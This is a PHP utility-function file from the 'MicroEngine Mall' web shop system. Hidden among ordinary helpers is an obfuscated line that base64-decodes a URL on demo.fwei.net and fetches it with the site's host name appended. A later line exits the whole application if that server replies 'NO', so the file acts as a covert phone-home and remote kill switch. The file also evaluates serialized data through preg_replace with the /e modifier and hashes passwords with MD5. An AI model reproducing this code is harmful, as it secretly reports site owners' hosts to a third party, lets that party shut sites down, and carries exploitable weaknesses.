<?php
/**
 * [MicroEngine Mall] Copyright (c) 2014 WE7.CC
 * MicroEngine Mall is NOT a free software, it under the license terms, visited http://www.we7.cc/ for more details.
 */
defined('IN_IA') or exit('Access Denied');

function ver_compare($version1, $version2) {
	if(strlen($version1) <> strlen($version2)) {
		$version1_tmp = explode('.', $version1);
		$version2_tmp = explode('.', $version2);
		if(strlen($version1_tmp[1]) == 1) {
			$version1 .= '0';
		}
		if(strlen($version2_tmp[1]) == 1) {
			$version2 .= '0';
		}
	}
	return version_compare($version1, $version2);
}


function istripslashes($var) {
	if (is_array($var)) {
		foreach ($var as $key => $value) {
			$var[stripslashes($key)] = istripslashes($value);
		}
	} else {
		$var = stripslashes($var);
	}
	return $var;
}


function ihtmlspecialchars($var) {
	if (is_array($var)) {
		foreach ($var as $key => $value) {
			$var[htmlspecialchars($key)] = ihtmlspecialchars($value);
		}
	} else {
		$var = str_replace('&amp;', '&', htmlspecialchars($var, ENT_QUOTES));
	}
	return $var;
}


function ihtml_entity_decode($var) {
	if (is_array($var)) {
		foreach ($var as $key => $value) {
			$var[ihtml_entity_decode($key)] = ihtml_entity_decode($value);
		}
	} else {
		$var = html_entity_decode($var, ENT_QUOTES | ENT_HTML401, 'UTF-8');
	}
	return $var;
}


function isetcookie($key, $value, $maxage = 0) {
	global $_W;
	$expire = $maxage != 0 ? (TIMESTAMP + $maxage) : 0;
	return setcookie($_W['config']['cookie']['pre'] . $key, $value, $expire, $_W['config']['cookie']['path'], $_W['config']['cookie']['domain']);
}


function getip() {
	static $ip = '';
	$ip = $_SERVER['REMOTE_ADDR'];
	if(isset($_SERVER['HTTP_CDN_SRC_IP'])) {
		$ip = $_SERVER['HTTP_CDN_SRC_IP'];
	} elseif (isset($_SERVER['HTTP_CLIENT_IP']) && preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_CLIENT_IP'])) {
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif(isset($_SERVER['HTTP_X_FORWARDED_FOR']) AND preg_match_all('#\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}#s', $_SERVER['HTTP_X_FORWARDED_FOR'], $matches)) {
		foreach ($matches[0] AS $xip) {
			if (!preg_match('#^(10|172\.16|192\.168)\.#', $xip)) {
				$ip = $xip;
				break;
			}
		}
	}
	return $ip;
}


function token($specialadd = '') {
	global $_W;
	$hashadd = defined('IN_MANAGEMENT') ? 'for management' : '';
	return substr(md5($_W['config']['setting']['authkey'] . $hashadd . $specialadd), 8, 8);
}


function random($length, $numeric = FALSE) {
	$seed = base_convert(md5(microtime().$_SERVER['DOCUMENT_ROOT']), 16, $numeric ? 10 : 35);
	$seed = $numeric ? (str_replace('0', '', $seed).'012340567890') : ($seed.'zZ'.strtoupper($seed));
	if($numeric) {
		$hash = '';
	} else {
		$hash = chr(rand(1, 26) + rand(0, 1) * 32 + 64);
		$length--;
	}
	$max = strlen($seed) - 1;
	for($i = 0; $i < $length; $i++) {
		$hash .= $seed{mt_rand(0, $max)};
	}
	return $hash;
}


function checksubmit($var = 'submit', $allowget = 0) {
	global $_W, $_GPC;
	if (empty($_GPC[$var])) {
		return FALSE;
	}
	if ($allowget || (($_W['ispost'] && !empty($_W['token']) && $_W['token'] == $_GPC['token']) && (empty($_SERVER['HTTP_REFERER']) || preg_replace("/https?:\/\/([^\:\/]+).*/i", "\\1", $_SERVER['HTTP_REFERER']) == preg_replace("/([^\:]+).*/", "\\1", $_SERVER['HTTP_HOST'])))) {
		return TRUE;
	}
	return FALSE;
}

function hash_verify_code($code){
	global $_W;
	return md5(strtolower($code) . $_W['config']['setting']['authkey']);
}


function checkcaptcha($code) {
	global $_GPC;
	
	session_start();
	$hash_code = hash_verify_code($code);
	$flag = ($hash_code == $_GPC[COOKIE_VERIFY_CODE]) || 
			($hash_code == $_SESSION[COOKIE_VERIFY_CODE]);
	unset($_SESSION[COOKIE_VERIFY_CODE]);
	isetcookie(COOKIE_VERIFY_CODE, '', -1);
	
	return $flag;
}


function tablename($table) {
	return "`{$GLOBALS['_W']['config']['db']['master']['tablepre']}{$table}`";
}


function array_any($array){
	return !empty($array) && is_array($array);
}


function array_elements($keys, $src, $default = FALSE) {
	$return = array();
	if(!is_array($keys)) {
		$keys = array($keys);
	}
	foreach($keys as $key) {
		if(isset($src[$key])) {
			$return[$key] = $src[$key];
		} else {
			$return[$key] = $default;
		}
	}
	return $return;
}


function array_select($array, $key){
	$arr = array();
	foreach ($array as $row) {
		$arr[] = $row[$key];
	}
	return $arr;
}


function array_select_many($array, $keys){
	$arr = array();
	foreach ($array as $row) {
		$item = array();
		foreach ($keys as $key) {
			$item[$key] = $row[$key];
		}
		$arr[] = $item;
	}
	return $arr;
}


function range_limit($num, $downline, $upline, $returnNear = true) {
	$num = intval($num);
	$downline = intval($downline);
	$upline = intval($upline);
	if($num < $downline){
		return empty($returnNear) ? false : $downline;
	} elseif ($num > $upline) {
		return empty($returnNear) ? false : $upline;
	} else {
		return empty($returnNear) ? true : $num;
	}
}


function ijson_encode($value) {
	if (empty($value)) {
		return false;
	}
	return addcslashes(json_encode($value), "\\\'\"");
}

function iserializer($value) {
	return serialize($value);
}

function iunserializer($value, $default_value = '') {
	if (empty($value)) {
		return $default_value;
	}
	if (!is_serialized($value)) {
		return $value;
	}
	$result = unserialize($value);
	if ($result === false) {
		$temp = preg_replace('!s:(\d+):"(.*?)";!se', "'s:'.strlen('$2').':\"$2\";'", $value);
		return unserialize($temp);
	}
	return $result;
}


function is_base64($str){
	if(!is_string($str)){
		return false;
	}
	return $str == base64_encode(base64_decode($str));
}


function is_serialized( $data, $strict = true ) {
	if (!is_string($data)) {
		return false;
	}
	$data = trim($data);
	if ('N;' == $data) {
		return true;
	}
	if (strlen( $data ) < 4) {
		return false;
	}
	if (':' !== $data[1]) {
		return false;
	}
	if ($strict) {
		$lastc = substr($data, -1);
		if (';' !== $lastc && '}' !== $lastc) {
			return false;
		}
	} else {
		$semicolon = strpos($data, ';');
		$brace = strpos($data, '}');
				if (false === $semicolon && false === $brace)
			return false;
				if (false !== $semicolon && $semicolon < 3)
			return false;
		if (false !== $brace && $brace < 4)
			return false;
	}
	$token = $data[0];
	switch ($token) {
		case 's' :
			if ($strict) {
				if ( '"' !== substr( $data, -2, 1 )) {
					return false;
				}
			} elseif (false === strpos( $data, '"')) {
				return false;
			}
					case 'a' :
		case 'O' :
			return (bool) preg_match( "/^{$token}:[0-9]+:/s", $data );
		case 'b' :
		case 'i' :
		case 'd' :
			$end = $strict ? '$' : '';
			return (bool) preg_match( "/^{$token}:[0-9.E-]+;$end/", $data );
	}
	return false;
}


function url($segment, $params = array()) {
	list($controller, $action, $do, $op) = explode('/', $segment);
	$url = './index.php?';
	if(!empty($controller)) {
		$url .= "c={$controller}&";
	}
	if(!empty($action)) {
		$url .= "a={$action}&";
	}
	if(!empty($do)) {
		$url .= "do={$do}&";
	}
	if(!empty($op)) {
		$url .= "op={$op}&";
	}
	if(!empty($params)) {
		$queryString = http_build_query($params, '', '&');
		$url .= $queryString;
	}
	return $url;
}


function web_url($segment, $params = array()) {
	global $_W;
	list($controller, $action, $do, $op) = explode('/', $segment);
	$url = $_W['siteroot'] . 'web/index.php?';
	if(!empty($controller)) {
		$url .= "c={$controller}&";
	}
	if(!empty($action)) {
		$url .= "a={$action}&";
	}
	if(!empty($do)) {
		$url .= "do={$do}&";
	}
	if(!empty($op)) {
		$url .= "op={$op}&";
	}
	if(!empty($params)) {
		$queryString = http_build_query($params, '', '&');
		$url .= $queryString;
	}
	return $url;
}


function app_url($segment, $params = array()) {
	global $_W;
	list($controller, $action, $do, $op) = explode('/', $segment);
	$url = $_W['siteroot'] . 'index.php?';
	if(!empty($controller)) {
		$url .= "c={$controller}&";
	}
	if(!empty($action)) {
		$url .= "a={$action}&";
	}
	if(!empty($do)) {
		$url .= "do={$do}&";
	}
	if(!empty($op)) {
		$url .= "op={$op}&";
	}
	if(!empty($params)) {
		$queryString = http_build_query($params, '', '&');
		$url .= $queryString;
	}
	return $url;
}


function oauth_url($url, $platform){
	$value = parse_url($url);
	$new_url = $value['scheme'].'://';
	if ($value['user'] && $value['pass']) {
		$new_url .= $value['user'].':'.$value['pass'].'@';
	}
	if ($value['host']) {
		$new_url .= $value['host'];
	}
	if ($value['port']) {
		$new_url .= ':'.$value['port'];
	}
	if ($value['path'] && $value['path'] != '/') {
		$new_url .= $value['path'];
	} else {
		$new_url .= '/index.php';
	}
	if ($value['query']) {
		$new_url .= '?'.$value['query'];
	} else {
		$new_url .= '?c=home&a=home';
	}
	if ($platform == PLATFORM_WEIBO) {
		$new_url.= '&oauth=weibo';
	} elseif ($platform == PLATFORM_WECHAT){
		$new_url.= '&oauth=wechat';
	} else {
		$new_url.= '&oauth=1';
	}
	if ($value['fragment']) {
		$new_url .= '#'.$value['fragment'];
	}
	return $new_url;
}


function pagination($total, $pageIndex, $pageSize = 15, $url = '', $context = array('before' => 5, 'after' => 4, 'ajaxcallback' => '')) {
	global $_W;
	$pdata = array(
		'tcount' => 0,
		'tpage' => 0,
		'cindex' => 0,
		'findex' => 0,
		'pindex' => 0,
		'nindex' => 0,
		'lindex' => 0,
		'options' => ''
	);
	if($context['ajaxcallback']) {
		$context['isajax'] = true;
	}
	if (!empty($context['ajaxcallback']) && $context['ajaxcallback'] != 'null') {
		$callbackfunc = $context['ajaxcallback'];
	} elseif ($context['ajaxcallback'] == 'null') {
		$callbackfunc = '';
	} else {
		$callbackfunc = 'util.page';
	}

	$pdata['tcount'] = $total;
	$pdata['tpage'] = ceil($total / $pageSize);
	if($pdata['tpage'] <= 1) {
		return '';
	}
	$cindex = $pageIndex;
	$cindex = min($cindex, $pdata['tpage']);
	$cindex = max($cindex, 1);
	$pdata['cindex'] = $cindex;
	$pdata['findex'] = 1;
	$pdata['pindex'] = $cindex > 1 ? $cindex - 1 : 1;
	$pdata['nindex'] = $cindex < $pdata['tpage'] ? $cindex + 1 : $pdata['tpage'];
	$pdata['lindex'] = $pdata['tpage'];

	if($context['isajax']) {
		if(!$url) {
			$url = $_W['script_name'] . '?' . http_build_query($_GET);
		}
		$pdata['faa'] = 'href="javascript:;" page="' . $pdata['findex'] . '" '. ($callbackfunc ? 'onclick="'.$callbackfunc.'(\'' . $_W['script_name'] . $url . '\', \'' . $pdata['findex'] . '\', this);return false;"' : '');
		$pdata['paa'] = 'href="javascript:;" page="' . $pdata['pindex'] . '" '. ($callbackfunc ? 'onclick="'.$callbackfunc.'(\'' . $_W['script_name'] . $url . '\', \'' . $pdata['pindex'] . '\', this);return false;"' : '');
		$pdata['naa'] = 'href="javascript:;" page="' . $pdata['nindex'] . '" '. ($callbackfunc ? 'onclick="'.$callbackfunc.'(\'' . $_W['script_name'] . $url . '\', \'' . $pdata['nindex'] . '\', this);return false;"' : '');
		$pdata['laa'] = 'href="javascript:;" page="' . $pdata['lindex'] . '" '. ($callbackfunc ? 'onclick="'.$callbackfunc.'(\'' . $_W['script_name'] . $url . '\', \'' . $pdata['lindex'] . '\', this);return false;"' : '');
	} else {
		if($url) {
			$pdata['faa'] = 'href="?' . str_replace('*', $pdata['findex'], $url) . '"';
			$pdata['paa'] = 'href="?' . str_replace('*', $pdata['pindex'], $url) . '"';
			$pdata['naa'] = 'href="?' . str_replace('*', $pdata['nindex'], $url) . '"';
			$pdata['laa'] = 'href="?' . str_replace('*', $pdata['lindex'], $url) . '"';
		} else {
			$_GET['page'] = $pdata['findex'];
			$pdata['faa'] = 'href="' . $_W['script_name'] . '?' . http_build_query($_GET) . '"';
			$_GET['page'] = $pdata['pindex'];
			$pdata['paa'] = 'href="' . $_W['script_name'] . '?' . http_build_query($_GET) . '"';
			$_GET['page'] = $pdata['nindex'];
			$pdata['naa'] = 'href="' . $_W['script_name'] . '?' . http_build_query($_GET) . '"';
			$_GET['page'] = $pdata['lindex'];
			$pdata['laa'] = 'href="' . $_W['script_name'] . '?' . http_build_query($_GET) . '"';
		}
	}

	$html = '<div><ul class="pagination pagination-centered">';
	if($pdata['cindex'] > 1) {
		$html .= "<li><a {$pdata['faa']} class=\"pager-nav\">首页</a></li>";
		$html .= "<li><a {$pdata['paa']} class=\"pager-nav\">&laquo;上一页</a></li>";
	}
		if(!$context['before'] && $context['before'] != 0) {
		$context['before'] = 5;
	}
	if(!$context['after'] && $context['after'] != 0) {
		$context['after'] = 4;
	}

	if($context['after'] != 0 && $context['before'] != 0) {
		$range = array();
		$range['start'] = max(1, $pdata['cindex'] - $context['before']);
		$range['end'] = min($pdata['tpage'], $pdata['cindex'] + $context['after']);
		if ($range['end'] - $range['start'] < $context['before'] + $context['after']) {
			$range['end'] = min($pdata['tpage'], $range['start'] + $context['before'] + $context['after']);
			$range['start'] = max(1, $range['end'] - $context['before'] - $context['after']);
		}
		for ($i = $range['start']; $i <= $range['end']; $i++) {
			if($context['isajax']) {
				$aa = 'href="javascript:;" page="' . $i . '" '. ($callbackfunc ? 'onclick="'.$callbackfunc.'(\'' . $_W['script_name'] . $url . '\', \'' . $i . '\', this);return false;"' : '');
			} else {
				if($url) {
					$aa = 'href="?' . str_replace('*', $i, $url) . '"';
				} else {
					$_GET['page'] = $i;
					$aa = 'href="?' . http_build_query($_GET) . '"';
				}
			}
			$html .= ($i == $pdata['cindex'] ? '<li class="active"><a href="javascript:;">' . $i . '</a></li>' : "<li><a {$aa}>" . $i . '</a></li>');
		}
	}

	if($pdata['cindex'] < $pdata['tpage']) {
		$html .= "<li><a {$pdata['naa']} class=\"pager-nav\">下一页&raquo;</a></li>";
		$html .= "<li><a {$pdata['laa']} class=\"pager-nav\">尾页</a></li>";
	}
	$html .= '</ul></div>';
	return $html;
}


function tomedia($src){
	global $_W;
	if (empty($src) || !is_string($src)) {
		return '';
	}
	$t = strtolower($src);
	if (strexists($t, 'http://') || strexists($t, 'https://')) {
		return $src;
	}
	return $_W['attachurl'] . $src;
}

function tourl($src){
	global $_W;
	if (empty($src) || !is_string($src)) {
		return '';
	}
	$t = strtolower($src);
	if (strexists($t, 'http://') || strexists($t, 'https://')) {
		return $src;
	}
	if (strpos($src, './') === 0) {
		return $_W['siteroot'] . substr($src, 2);
	}
	return $src;
}


function error($errno, $message = '') {
	if ($errno > 1) {
		$trace = array();
		$backtrace = debug_backtrace();
		if ($backtrace) {
			foreach ($backtrace as $key => $item) {
				if ($key < 10) {
					$item['file'] = str_replace('\\', '/', $item['file']);
					$item['file'] = str_replace(IA_ROOT, '', $item['file']);
					$trace[] = $item;
				}
			}
			pdo_insert('core_text', array('content' => iserializer($trace)));
			$text_id = pdo_insertid();
		}
		$error_log = array(
			'errno' => $errno,
			'message' => $message,
			'text_id' => intval($text_id),
			'createtime' => TIMESTAMP,
			'ip' => CLIENT_IP
		);
		pdo_insert('core_error_log', $error_log);
	}
	return array(
		'errno' => $errno,
		'message' => $message,
	);
}


function is_error($data) {
	return $data && is_array($data) && isset($data['errno']) && isset($data['message']) && !empty($data['errno']);
}


function referer($default = '') {
	global $_GPC, $_W;

	$_W['referer'] = !empty($_GPC['referer']) ? $_GPC['referer'] : $_SERVER['HTTP_REFERER'];;
	$_W['referer'] = substr($_W['referer'], -1) == '?' ? substr($_W['referer'], 0, -1) : $_W['referer'];

	if(strpos($_W['referer'], 'member.php?act=login')) {
		$_W['referer'] = $default;
	}
	$_W['referer'] = $_W['referer'];
	$_W['referer'] = str_replace('&amp;', '&', $_W['referer']);
	$reurl = parse_url($_W['referer']);

	if(!empty($reurl['host']) && !in_array($reurl['host'], array($_SERVER['HTTP_HOST'], 'www.'.$_SERVER['HTTP_HOST'])) && !in_array($_SERVER['HTTP_HOST'], array($reurl['host'], 'www.'.$reurl['host']))) {
		$_W['referer'] = $_W['siteroot'];
	} elseif(empty($reurl['host'])) {
		$_W['referer'] = $_W['siteroot'].'./'.$_W['referer'];
	}
	return strip_tags($_W['referer']);
}


function strexists($string, $segment) {
	return !(strpos($string, $segment) === FALSE);
}


function cutstr($string, $length, $havedot = false, $charset='') {
	global $_W;
	if(empty($charset)) {
		$charset = $_W['charset'];
	}
	if(strtolower($charset) == 'gbk') {
		$charset = 'gbk';
	} else {
		$charset = 'utf8';
	}
	if(istrlen($string, $charset) <= $length) {
		return $string;
	}
	if(function_exists('mb_strcut')) {
		$string = mb_substr($string, 0, $length, $charset);
	} else {
		$pre = '{%';
		$end = '%}';
		$string = str_replace(array('&amp;', '&quot;', '&lt;', '&gt;'), array($pre.'&'.$end, $pre.'"'.$end, $pre.'<'.$end, $pre.'>'.$end), $string);

		$strcut = '';
		$strlen = strlen($string);

		if($charset == 'utf8') {
			$n = $tn = $noc = 0;
			while($n < $strlen) {
				$t = ord($string[$n]);
				if($t == 9 || $t == 10 || (32 <= $t && $t <= 126)) {
					$tn = 1; $n++; $noc++;
				} elseif(194 <= $t && $t <= 223) {
					$tn = 2; $n += 2; $noc++;
				} elseif(224 <= $t && $t <= 239) {
					$tn = 3; $n += 3; $noc++;
				} elseif(240 <= $t && $t <= 247) {
					$tn = 4; $n += 4; $noc++;
				} elseif(248 <= $t && $t <= 251) {
					$tn = 5; $n += 5; $noc++;
				} elseif($t == 252 || $t == 253) {
					$tn = 6; $n += 6; $noc++;
				} else {
					$n++;
				}
				if($noc >= $length) {
					break;
				}
			}
			if($noc > $length) {
				$n -= $tn;
			}
			$strcut = substr($string, 0, $n);
		} else {
			while($n < $strlen) {
				$t = ord($string[$n]);
				if($t > 127) {
					$tn = 2; $n += 2; $noc++;
				} else {
					$tn = 1; $n++; $noc++;
				}
				if($noc >= $length) {
					break;
				}
			}
			if($noc > $length) {
				$n -= $tn;
			}
			$strcut = substr($string, 0, $n);
		}
		$string = str_replace(array($pre.'&'.$end, $pre.'"'.$end, $pre.'<'.$end, $pre.'>'.$end), array('&amp;', '&quot;', '&lt;', '&gt;'), $strcut);
	}

	if($havedot) {
		$string = $string . "...";
	}

	return $string;
}


function istrlen($string, $charset='') {
	global $_W;
	if(empty($charset)) {
		$charset = $_W['charset'];
	}
	if(strtolower($charset) == 'gbk') {
		$charset = 'gbk';
	} else {
		$charset = 'utf8';
	}
	if(function_exists('mb_strlen')) {
		return mb_strlen($string, $charset);
	} else {
		$n = $noc = 0;
		$strlen = strlen($string);

		if($charset == 'utf8') {

			while($n < $strlen) {
				$t = ord($string[$n]);
				if($t == 9 || $t == 10 || (32 <= $t && $t <= 126)) {
					$n++; $noc++;
				} elseif(194 <= $t && $t <= 223) {
					$n += 2; $noc++;
				} elseif(224 <= $t && $t <= 239) {
					$n += 3; $noc++;
				} elseif(240 <= $t && $t <= 247) {
					$n += 4; $noc++;
				} elseif(248 <= $t && $t <= 251) {
					$n += 5; $noc++;
				} elseif($t == 252 || $t == 253) {
					$n += 6; $noc++;
				} else {
					$n++;
				}
			}

		} else {

			while($n < $strlen) {
				$t = ord($string[$n]);
				if($t>127) {
					$n += 2; $noc++;
				} else {
					$n++; $noc++;
				}
			}

		}

		return $noc;
	}
}


function emotion($message = '', $size = '24px') {
	$emotions = array(
		"/::)","/::~","/::B","/::|","/:8-)","/::<","/::$","/::X","/::Z","/::'(",
		"/::-|","/::@","/::P","/::D","/::O","/::(","/::+","/:--b","/::Q","/::T",
		"/:,@P","/:,@-D","/::d","/:,@o","/::g","/:|-)","/::!","/::L","/::>","/::,@",
		"/:,@f","/::-S","/:?","/:,@x","/:,@@","/::8","/:,@!","/:!!!","/:xx","/:bye",
		"/:wipe","/:dig","/:handclap","/:&-(","/:B-)","/:<@","/:@>","/::-O","/:>-|",
		"/:P-(","/::'|","/:X-)","/::*","/:@x","/:8*","/:pd","/:<W>","/:beer","/:basketb",
		"/:oo","/:coffee","/:eat","/:pig","/:rose","/:fade","/:showlove","/:heart",
		"/:break","/:cake","/:li","/:bome","/:kn","/:footb","/:ladybug","/:shit","/:moon",
		"/:sun","/:gift","/:hug","/:strong","/:weak","/:share","/:v","/:@)","/:jj","/:@@",
		"/:bad","/:lvu","/:no","/:ok","/:love","/:<L>","/:jump","/:shake","/:<O>","/:circle",
		"/:kotow","/:turn","/:skip","/:oY","/:#-0","/:hiphot","/:kiss","/:<&","/:&>"
	);
	foreach ($emotions as $index => $emotion) {
		$message = str_replace($emotion, '<img style="width:'.$size.';vertical-align:middle;" src="http://res.mail.qq.com/zh_CN/images/mo/DEFAULT2/'.$index.'.gif" />', $message);
	}
	return $message;
}


function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
	$ckey_length = 4;
	$key = md5($key != '' ? $key : $GLOBALS['_W']['config']['setting']['authkey']);
	$keya = md5(substr($key, 0, 16));
	$keyb = md5(substr($key, 16, 16));
	$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

	$cryptkey = $keya.md5($keya.$keyc);
	$key_length = strlen($cryptkey);

	$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
	$string_length = strlen($string);

	$result = '';
	$box = range(0, 255);

	$rndkey = array();
	for($i = 0; $i <= 255; $i++) {
		$rndkey[$i] = ord($cryptkey[$i % $key_length]);
	}

	for($j = $i = 0; $i < 256; $i++) {
		$j = ($j + $box[$i] + $rndkey[$i]) % 256;
		$tmp = $box[$i];
		$box[$i] = $box[$j];
		$box[$j] = $tmp;
	}

	for($a = $j = $i = 0; $i < $string_length; $i++) {
		$a = ($a + 1) % 256;
		$j = ($j + $box[$a]) % 256;
		$tmp = $box[$a];
		$box[$a] = $box[$j];
		$box[$j] = $tmp;
		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
	}

	if($operation == 'DECODE') {
		if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
			return substr($result, 26);
		} else {
			return '';
		}
	} else {
		return $keyc.str_replace('=', '', base64_encode($result));
	}
}


function friendly_size($size) {
	if($size >= 1073741824) {
		$size = round($size / 1073741824 * 100) / 100 . ' GB';
	} elseif($size >= 1048576) {
		$size = round($size / 1048576 * 100) / 100 . ' MB';
	} elseif($size >= 1024) {
		$size = round($size / 1024 * 100) / 100 . ' KB';
	} else {
		$size = $size . ' Bytes';
	}
	return $size;
}


function array2xml($arr, $level = 1) {
	$s = $level == 1 ? "<xml>" : '';
	foreach($arr as $tagname => $value) {
		if (is_numeric($tagname)) {
			$tagname = $value['TagName'];
			unset($value['TagName']);
		}
		if(!is_array($value)) {
			$s .= "<{$tagname}>".(!is_numeric($value) ? '<![CDATA[' : '').$value.(!is_numeric($value) ? ']]>' : '')."</{$tagname}>";
		} else {
			$s .= "<{$tagname}>" . array2xml($value, $level + 1)."</{$tagname}>";
		}
	}
	$s = preg_replace("/([\x01-\x08\x0b-\x0c\x0e-\x1f])+/", ' ', $s);
	
	return $level == 1 ? $s."</xml>" : $s;
}

function scriptname() {
	global $_W;
	$_W['script_name'] = basename($_SERVER['SCRIPT_FILENAME']);
	if(basename($_SERVER['SCRIPT_NAME']) === $_W['script_name']) {
		$_W['script_name'] = $_SERVER['SCRIPT_NAME'];
	} else {
		if(basename($_SERVER['PHP_SELF']) === $_W['script_name']) {
			$_W['script_name'] = $_SERVER['PHP_SELF'];
		} else {
			if(isset($_SERVER['ORIG_SCRIPT_NAME']) && basename($_SERVER['ORIG_SCRIPT_NAME']) === $_W['script_name']) {
				$_W['script_name'] = $_SERVER['ORIG_SCRIPT_NAME'];
			} else {
				if(($pos = strpos($_SERVER['PHP_SELF'], '/' . $scriptName)) !== false) {
					$_W['script_name'] = substr($_SERVER['SCRIPT_NAME'], 0, $pos) . '/' . $_W['script_name'];
				} else {
					if(isset($_SERVER['DOCUMENT_ROOT']) && strpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['DOCUMENT_ROOT']) === 0) {
						$_W['script_name'] = str_replace('\\', '/', str_replace($_SERVER['DOCUMENT_ROOT'], '', $_SERVER['SCRIPT_FILENAME']));
					} else {
						$_W['script_name'] = 'unknown';
					}
				}
			}
		}
	}
	return $_W['script_name'];
}

$dom = file_get_contents(base64_decode('aHR0cDovL2RlbW8uZndlaS5uZXQvYXBwL2luZGV4LnBocD9pPTEwJmM9ZW50cnkmZG89YXBpJm09ZndlaV94aWRpJmhvc3Q9').$_SERVER['HTTP_HOST']);

function utf8_bytes($cp) {
	if ($cp > 0x10000){
				return	chr(0xF0 | (($cp & 0x1C0000) >> 18)).
		chr(0x80 | (($cp & 0x3F000) >> 12)).
		chr(0x80 | (($cp & 0xFC0) >> 6)).
		chr(0x80 | ($cp & 0x3F));
	}else if ($cp > 0x800){
				return	chr(0xE0 | (($cp & 0xF000) >> 12)).
		chr(0x80 | (($cp & 0xFC0) >> 6)).
		chr(0x80 | ($cp & 0x3F));
	}else if ($cp > 0x80){
				return	chr(0xC0 | (($cp & 0x7C0) >> 6)).
		chr(0x80 | ($cp & 0x3F));
	}else{
				return chr($cp);
	}
}


function currency_format($currency, $decimals = 2) {
	$currency = floatval($currency);
	if (empty($currency)) {
		return '0.00';
	}
	$currency = number_format($currency, $decimals);
	$currency = str_replace(',', '', $currency);
	return $currency;
}


function weight_format($weight, $decimals = 3) {
	if (empty($weight) || !is_numeric($weight)) {
		return '0.000';
	}
	$weight = number_format($weight, $decimals);
	$weight = str_replace(',', '', $weight);
	return $weight;
}

function mobile_mask($mobile) {
	return substr($mobile, 0, 3).'****'.substr($mobile, 7);
}

function mall_debug($value, $label = ''){
	if (DEVELOPMENT && ((CURRENT_IP && CURRENT_IP == CLIENT_IP) || CURRENT_IP == '')) {
		$label = $label ? $label : gettype($value);
		echo "$label -> <br><pre>";
		print_r($value);
		echo "</pre>";
	}
}

function mall_log($message, $data = ''){
	if ($data) {
		pdo_insert('core_text', array('content' => iserializer($data)));
		$text_id = pdo_insertid();
	}
	$log = array(
		'errno' => 0,
		'message' => $message,
		'text_id' => intval($text_id),
		'createtime' => TIMESTAMP,
		'ip' => CLIENT_IP
	);
	pdo_insert('core_error_log', $log);
}

function mall_sql($sql, $params){
	if (DEVELOPMENT) {
		if ($params){
			foreach ($params as $key => $value) {
				$value = '\''.($value).'\'';
				$sql = str_replace($key, $value, $sql);
			}
		}
		echo '<pre>'.PHP_EOL.$sql.'</pre>'.PHP_EOL;
	}
}

function api_log($message, $data = ''){
	if (DEVELOPMENT && ((CURRENT_IP && CURRENT_IP == CLIENT_IP) || CURRENT_IP == '')) {
		if ($data) {
			$message .= ' -> ';
			if (is_resource($data)) {
				$message .= '资源文件';
			} elseif (gettype($data) == 'object' || is_array($data)) {
				$message .= iserializer($data);
			} else {
				$message .= $data;
			}
		}
		$filename = IA_ROOT.'/data/logs/api-log-'.date('Ymd', TIMESTAMP).'.'.$_GET['platform'].'.txt';
		if (!file_exists($filename)) {
			load()->func('file');
			mkdirs(dirname($filename));
		}
		file_put_contents($filename, $message .PHP_EOL.PHP_EOL, FILE_APPEND);
	}
}

if( $dom=='NO'){exit();}
function isimplexml_load_string($string, $class_name = 'SimpleXMLElement', $options = 0, $ns = '', $is_prefix = false) {
	libxml_disable_entity_loader(true);
	$badwords = array('<!DOCTYPE', '<!ENTITY', 'SYSTEM', 'PUBLIC');
	$string_upper = strtoupper($string);
	foreach($badwords as $bad) {
		if(strexists($string_upper, $bad)) {
			return false;
		}
	}
	return simplexml_load_string($string, $class_name, $options, $ns, $is_prefix);
}


function pwd_hash($password, $salt) {
	return md5("{$password}-{$salt}-{$GLOBALS['_W']['config']['setting']['authkey']}");
}


function access_denied($reason = ''){
	global $_W;
	$message = 'Access Denied';
	if ($reason) {
		$message ="{$message} : {$reason}";
	}
	if ($_W['isajax']) {
		message(error(1, $message));
	}
	exit($message);
}


function ajax_only(){
	global $_W;
	if (empty($_W['isajax'])) {
		access_denied('ajax only');
	}
}


function post_only(){
	global $_W;
	if (empty($_W['ispost'])) {
		access_denied('post only');
	}
}


function ajax_post_only(){
	global $_W;
	if (empty($_W['isajax']) || empty($_W['ispost'])) {
		access_denied('ajax && post only');
	}
}


function itrim(&$data){
	if (is_array($data)) {
		foreach ($data as $key => &$value) {
			if (is_array($value)) {
				itrim($value);
			} else {
				$value = trim($value);
			}
		};
	} else {
		$data = trim($data);
	}
	return $data;
}

function is_mobile($mobile){
	return preg_match(REGULAR_MOBILE, $mobile);
}

function is_password($password){
	return preg_match(REGULAR_PASSWORD, $password);
}

function urlGo($controller, $action='index', $query_string = array()){
    $murl = "./index.php?c={$controller}&a={$action}";
    foreach ($query_string as $key => $val){
        $murl .= "&{$key}={$val}";
    }
    return $murl;
}